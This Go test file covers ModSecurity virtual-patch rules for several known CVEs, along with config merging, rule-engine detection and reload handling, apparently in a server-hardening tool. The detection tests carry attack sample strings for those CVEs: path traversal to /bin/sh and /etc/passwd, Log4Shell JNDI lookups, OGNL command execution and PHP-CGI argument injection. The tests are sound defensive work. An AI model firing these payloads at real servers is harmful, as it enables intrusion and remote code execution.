package modsecurity

import (
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"
)

var (
	ruleIDRe   = regexp.MustCompile(`\bid:(\d+)`)
	operatorRe = regexp.MustCompile(`^\s*SecRule \S+ "@rx (.*?)" "`)
)

func TestVirtualPatchCatalog(t *testing.T) {
	all, err := VirtualPatches()
	if err != nil {
		t.Fatalf("catalog does not parse: %v", err)
	}
	if len(all) < 6 || len(all) > 10 {
		t.Errorf("catalog has %d entries, want 6-10", len(all))
	}
	seenRule, seenID := map[string]bool{}, map[int]bool{}
	cveRe := regexp.MustCompile(`^CVE-\d{4}-\d{4,}$`)
	for _, p := range all {
		if seenRule[p.RuleID] {
			t.Errorf("duplicate rule_id %s", p.RuleID)
		}
		seenRule[p.RuleID] = true
		if p.RuleID != "vp-"+strings.ToLower(p.CVE) {
			t.Errorf("%s: rule_id does not match cve %s", p.RuleID, p.CVE)
		}
		if !cveRe.MatchString(p.CVE) || p.Title == "" || len(p.Webservers) == 0 {
			t.Errorf("%s: incomplete entry %+v", p.RuleID, p)
		}
		lines := strings.Split(p.Rule, "\n")
		chains := strings.Count(p.Rule, ",chain")
		if len(lines) != chains+1 {
			t.Errorf("%s: %d lines for %d chained rules", p.RuleID, len(lines), chains)
		}
		for i, l := range lines {
			if !strings.HasPrefix(strings.TrimSpace(l), "SecRule ") || (i > 0 && !strings.HasPrefix(l, "    ")) {
				t.Errorf("%s: unexpected line %q", p.RuleID, l)
			}
		}
		if !strings.Contains(lines[0], ",deny,") || strings.Contains(p.Rule, "SecRuleEngine") {
			t.Errorf("%s: first rule must deny and must not change the engine", p.RuleID)
		}
		ids := ruleIDRe.FindAllStringSubmatch(p.Rule, -1)
		if len(ids) != 1 {
			t.Errorf("%s: want exactly one rule id, got %d", p.RuleID, len(ids))
		}
		for _, m := range ids {
			id, _ := strconv.Atoi(m[1])
			if id < 9920000 || id > 9929999 || seenID[id] {
				t.Errorf("%s: rule id %d out of range or reused", p.RuleID, id)
			}
			seenID[id] = true
		}
	}
}

// The operators are PCRE in ModSecurity; Go's regexp accepts the subset used
// here, which lets the attack and benign samples run without Apache. The
// samples are the variables after the rule's transformations.
func TestVirtualPatchMatches(t *testing.T) {
	cases := map[string]struct{ attack, benign []string }{
		"vp-cve-2021-41773": {
			attack: []string{"/cgi-bin/.%2e/.%2e/.%2e/bin/sh", "/icons/.%2e/%2e%2e/etc/passwd", "/x/%2E%2E%2Fetc"},
			benign: []string{"/index.php?q=a.%2e/b", "/files/report.v2.pdf", "/a%20b/"},
		},
		"vp-cve-2021-42013": {
			attack: []string{"/cgi-bin/.%%32%65/.%%32%65/bin/sh", "/icons/%%32%65%%32%65/etc/passwd", "/cgi-bin/%2%65%2%65/x", "/x/.%%32e/y"},
			benign: []string{"/search?q=%252e", "/blog/100%25-done/"},
		},
		"vp-cve-2024-4577": {
			attack: []string{"%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "a=1+%ads"},
			benign: []string{"name=Stra%C3%9Fe", "q=caf%C3%A9+%C2%AD", "page=2&sort=asc"},
		},
		"vp-cve-2021-44228": {
			attack: []string{"${jndi:ldap://x.example/a}", "${${lower:j}ndi:ldap://x/a}", "${${::-j}${::-n}di:rmi://x/a}", "${j${::-n}di:dns://x}", "${${env:NaN:-j}ndi:x}"},
			benign: []string{"price ${total}", "${HOME}/bin", "Mozilla/5.0 (X11; Linux x86_64)"},
		},
		"vp-cve-2022-26134": {
			attack: []string{"/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"id\")))}/"},
			benign: []string{"/wiki/spaces/DOC/pages/1/Price+$100", "/index.php"},
		},
		"vp-cve-2023-22527": {
			attack: []string{"/template/aui/text-inline.vm", "/confluence/template/aui/TEXT-INLINE.vm"},
			benign: []string{"/template/aui/text-inline.vm.css", "/display/DOC/Home"},
		},
		"vp-cve-2017-5638": {
			attack: []string{"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}", "${#context['xwork.MethodAccessor.denyMethodExecution']=false}"},
			benign: []string{"multipart/form-data; boundary=----WebKitFormBoundary7MA4", "application/json; charset=utf-8"},
		},
		"vp-cve-2023-23752": {
			attack: []string{"/api/index.php/v1/config/application", "/joomla/api/index.php/v1/users"},
			benign: []string{"/api/v1/users", "/index.php/component/content"},
		},
	}
	all, _ := VirtualPatches()
	for _, p := range all {
		c, ok := cases[p.RuleID]
		if !ok {
			t.Errorf("%s: no samples", p.RuleID)
			continue
		}
		m := operatorRe.FindStringSubmatch(strings.Split(p.Rule, "\n")[0])
		if m == nil {
			t.Fatalf("%s: no @rx operator in %q", p.RuleID, p.Rule)
		}
		re, err := regexp.Compile(m[1])
		if err != nil {
			t.Fatalf("%s: regex does not compile: %v", p.RuleID, err)
		}
		for _, s := range c.attack {
			if !re.MatchString(s) {
				t.Errorf("%s: attack not matched: %q", p.RuleID, s)
			}
		}
		for _, s := range c.benign {
			if re.MatchString(s) {
				t.Errorf("%s: benign matched: %q", p.RuleID, s)
			}
		}
	}
}

func TestRenderVirtualPatches(t *testing.T) {
	out := renderVirtualPatches([]string{"vp-cve-2021-44228", "nope", "vp-cve-2021-41773", "vp-cve-2021-44228"})
	if got := parseAppliedPatches(out); !slices.Equal(got, []string{"vp-cve-2021-41773", "vp-cve-2021-44228"}) {
		t.Errorf("applied: %v", got)
	}
	if strings.Contains(out, "nope") || strings.Count(out, "id:99200") != 2 {
		t.Errorf("unexpected render:\n%s", out)
	}
	if renderVirtualPatches(nil) != "" {
		t.Errorf("empty set renders a block")
	}
	if strings.Count(out, "id:9929999") != 1 || slices.Contains(parseAppliedPatches(out), "") {
		t.Errorf("probe rule missing or read as a patch:\n%s", out)
	}
}

func TestMergeBlockKeepsOtherContent(t *testing.T) {
	before := "# InfraFence dynamic rules\n# vpatch vp-cve-2024-4577\nSecRule ARGS \"@rx owner\" \"id:12345,deny\"\n"
	after := "\n# owner's line after\n"
	block := renderVirtualPatches([]string{"vp-cve-2021-41773"})

	merged := mergeBlock(before, block)
	if !strings.HasPrefix(merged, before) || !strings.HasSuffix(merged, block) {
		t.Fatalf("append:\n%s", merged)
	}
	// A "# vpatch" line outside the block is not ours.
	if got := parseAppliedPatches(merged); !slices.Equal(got, []string{"vp-cve-2021-41773"}) {
		t.Errorf("applied: %v", got)
	}
	merged += after
	re := mergeBlock(merged, renderVirtualPatches([]string{"vp-cve-2021-44228"}))
	if !strings.HasPrefix(re, before) || !strings.HasSuffix(re, after) || !slices.Equal(parseAppliedPatches(re), []string{"vp-cve-2021-44228"}) {
		t.Errorf("replace:\n%s", re)
	}
	if got := mergeBlock(re, ""); got != before+after {
		t.Errorf("remove left %q", got)
	}
	if mergeBlock(before, "") != before {
		t.Errorf("removing a missing block changed the file")
	}
	if got := mergeBlock("x", block); got != "x\n"+block {
		t.Errorf("no trailing newline: %q", got)
	}
}

func TestRuleEngine(t *testing.T) {
	dir := t.TempDir()
	main := filepath.Join(dir, "apache2.conf")
	modsec := filepath.Join(dir, "modsecurity.conf")
	vhost := filepath.Join(dir, "site.conf")
	os.WriteFile(main, []byte("ServerRoot /etc/apache2\n# SecRuleEngine Off\n"), 0644)
	os.WriteFile(modsec, []byte("SecRuleEngine DetectionOnly\nSecRequestBodyAccess On\n"), 0644)
	os.WriteFile(vhost, []byte("<VirtualHost *:80>\n  SecRuleEngine On\n</VirtualHost>\n"), 0644)
	out := "Included configuration files:\n  (*) " + main + "\n    (146) " + modsec + "\n      (12) " + vhost + "\nSyntax OK\n"

	files := parseIncludes(out)
	if !slices.Equal(files, []string{main, modsec, vhost}) {
		t.Fatalf("includes: %v", files)
	}
	if got := effectiveRuleEngine(files); got != "on" {
		t.Errorf("last wins: got %q", got)
	}
	if got := effectiveRuleEngine(files[:2]); got != "detectiononly" {
		t.Errorf("got %q, want detectiononly", got)
	}
	if got := effectiveRuleEngine(files[:1]); got != "" {
		t.Errorf("comment read as a directive: %q", got)
	}
}

func TestVirtualPatchesEnforced(t *testing.T) {
	dir := t.TempDir()
	conf := filepath.Join(dir, "modsecurity.conf")
	oldProbe, oldDump, oldWait := vpatchProbe, dumpIncludes, probeWait
	t.Cleanup(func() { vpatchProbe, dumpIncludes, probeWait = oldProbe, oldDump, oldWait })
	probeWait = 0
	dumpIncludes = func(*Engine) string { return "Included configuration files:\n  (*) " + conf + "\n" }
	e := &Engine{}

	for name, c := range map[string]struct {
		engine            string
		baseline, blocked int
		want              bool
	}{
		"on and blocked":                {"On", 200, 403, true},
		"detection only":                {"DetectionOnly", 200, 403, false},
		"off":                           {"Off", 200, 403, false},
		"probe not blocked":             {"On", 200, 200, false},
		"unknown engine, blocked":       {"", 200, 403, true},
		"no answer, engine on":          {"On", -1, -1, true},
		"no answer, engine unknown":     {"", -1, -1, false},
		"page is a 403, engine on":      {"On", 403, 403, true},
		"page is a 403, engine unknown": {"", 403, 403, false},
	} {
		content := ""
		if c.engine != "" {
			content = "SecRuleEngine " + c.engine + "\n"
		}
		os.WriteFile(conf, []byte(content), 0644)
		vpatchProbe = func(withHeader bool) int {
			if withHeader {
				return c.blocked
			}
			return c.baseline
		}
		ok, msg := e.VirtualPatchesEnforced()
		if ok != c.want || (!ok && !strings.HasPrefix(msg, IneffectiveMessage)) {
			t.Errorf("%s: got %v %q", name, ok, msg)
		}
	}
}

func TestSetVirtualPatchesKeepsUnknownContent(t *testing.T) {
	e, dir := fakeEngine(t)
	path := filepath.Join(dir, dynamicRules)
	own := "# InfraFence dynamic rules\nSecRule ARGS \"@rx owner\" \"id:12345,deny\"\n"
	os.WriteFile(path, []byte(own), 0644)
	if _, _, err := e.SetVirtualPatches([]string{"vp-cve-2021-41773"}); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(path); !strings.HasPrefix(string(b), own) {
		t.Errorf("apply changed the owner's content:\n%s", b)
	}
	if _, _, err := e.SetVirtualPatches(nil); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(path); string(b) != own {
		t.Errorf("remove left %q", b)
	}
}

// fakeEngine runs against a temp dir and a fake apachectl that fails the
// config test while dir/fail-configtest exists and logs graceful reloads.
func fakeEngine(t *testing.T) (*Engine, string) {
	dir := t.TempDir()
	ctl := filepath.Join(dir, "apachectl")
	script := "#!/bin/sh\ncase \"$1\" in\n" +
		"configtest) [ -e " + dir + "/fail-configtest ] && { echo 'Syntax error on line 3'; exit 1; }; exit 0;;\n" +
		"graceful) echo ok >>" + dir + "/graceful.log;;\nesac\n"
	if err := os.WriteFile(ctl, []byte(script), 0755); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(dir, dynamicRules), []byte("# InfraFence dynamic rules\n"), 0644)
	return &Engine{available: true, setUp: true, apachectl: ctl, modsecDir: dir}, dir
}

func reloads(dir string) int {
	b, _ := os.ReadFile(filepath.Join(dir, "graceful.log"))
	return strings.Count(string(b), "ok")
}

func TestSetVirtualPatches(t *testing.T) {
	e, dir := fakeEngine(t)
	path := filepath.Join(dir, dynamicRules)
	orig, _ := os.ReadFile(path)

	undo, changed, err := e.SetVirtualPatches([]string{"vp-cve-2021-41773"})
	if err != nil || !changed || undo == nil {
		t.Fatalf("apply: changed=%v err=%v", changed, err)
	}
	if got := e.AppliedVirtualPatches(); !slices.Equal(got, []string{"vp-cve-2021-41773"}) || reloads(dir) != 1 {
		t.Fatalf("applied %v, %d reloads", got, reloads(dir))
	}

	// Same set again: nothing written, no reload.
	if _, changed, err := e.SetVirtualPatches([]string{"vp-cve-2021-41773"}); err != nil || changed || reloads(dir) != 1 {
		t.Errorf("no-op: changed=%v err=%v reloads=%d", changed, err, reloads(dir))
	}

	// Undo puts the previous file back and reloads.
	if err := undo(); err != nil {
		t.Fatalf("undo: %v", err)
	}
	if b, _ := os.ReadFile(path); string(b) != string(orig) || reloads(dir) != 2 {
		t.Errorf("undo left %q, %d reloads", b, reloads(dir))
	}

	// A failed config test leaves the file as it was and does not reload.
	os.WriteFile(filepath.Join(dir, "fail-configtest"), nil, 0644)
	if _, _, err := e.SetVirtualPatches([]string{"vp-cve-2024-4577"}); err == nil || !strings.Contains(err.Error(), "Syntax error") {
		t.Errorf("config test failure not reported: %v", err)
	}
	if b, _ := os.ReadFile(path); string(b) != string(orig) || reloads(dir) != 2 {
		t.Errorf("failed config test left %q, %d reloads", b, reloads(dir))
	}
}

func TestSetVirtualPatchesNotActive(t *testing.T) {
	e, dir := fakeEngine(t)
	e.setUp = false
	if _, _, err := e.SetVirtualPatches([]string{"vp-cve-2021-41773"}); err != ErrNotActive {
		t.Errorf("got %v, want ErrNotActive", err)
	}
	if reloads(dir) != 0 || len(e.AppliedVirtualPatches()) != 0 {
		t.Errorf("changed something while not active")
	}

	// Removing an applied patch still works.
	os.WriteFile(filepath.Join(dir, dynamicRules), []byte(renderVirtualPatches([]string{"vp-cve-2021-41773", "vp-cve-2024-4577"})), 0644)
	if _, changed, err := e.SetVirtualPatches([]string{"vp-cve-2024-4577"}); err != nil || !changed {
		t.Fatalf("remove while not active: changed=%v err=%v", changed, err)
	}
	if got := e.AppliedVirtualPatches(); !slices.Equal(got, []string{"vp-cve-2024-4577"}) || reloads(dir) != 1 {
		t.Errorf("after remove: %v, %d reloads", got, reloads(dir))
	}
	if _, _, err := e.SetVirtualPatches([]string{"vp-cve-2024-4577", "vp-cve-2021-41773"}); err != ErrNotActive {
		t.Errorf("re-adding while not active: %v", err)
	}
}
